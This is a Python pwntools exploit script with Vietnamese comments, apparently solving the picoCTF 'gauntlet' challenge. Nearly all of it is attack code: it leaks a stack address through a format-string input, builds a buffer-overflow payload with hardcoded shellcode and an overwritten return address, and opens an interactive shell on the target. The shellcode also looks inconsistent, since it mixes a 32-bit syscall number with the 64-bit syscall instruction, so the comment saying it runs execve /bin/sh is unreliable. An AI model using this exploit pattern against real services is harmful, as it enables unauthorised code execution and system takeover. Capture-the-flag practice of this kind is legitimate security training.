from pwn import *
# Su dung thu vien pwntools

DEBUG = True
if DEBUG:
    r = process("./gauntlet")
    gdb.attach(r)
else:
    r = remote("mercury.picoctf.net", 37752)
# Ket noi den remote server
input1 = "%6$p"
# Lay dia chi tham so thu 6 (random stack)
r.sendline(input1)
# Gui input den remote server
random_stack_addr = int(r.recv(),16)
# Chuyen chuoi tra ve tu remote o kieu hex sang sang so nguyen

s_ret_addr = random_stack_addr - 224    
# Tinh dia chi cua return address tren stack (remote)
offset_dest_ret = 136 
# = 0x7ffffffeddd8(ret) - 0x7ffffffedd50(dest) (GDB)
dest_addr = s_ret_addr - 136
# Tinh dia chi cua dest (remote)

shellcode = "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x31\xDB\x31\xC9\x31\xD2\x5B\x83\xC0\x0B\x0F\x05"
# shellcode chay system call execve /bin/sh
input2 = shellcode + "a"*(offset_dest_ret - len(shellcode)) + p64(dest_addr)
# Payload ghi de return address
r.sendline(input2)
# Gui payload den remote server

r.interactive()
# Cho phep tuong tac lien tuc voi he thong bang shell da khai thac duoc
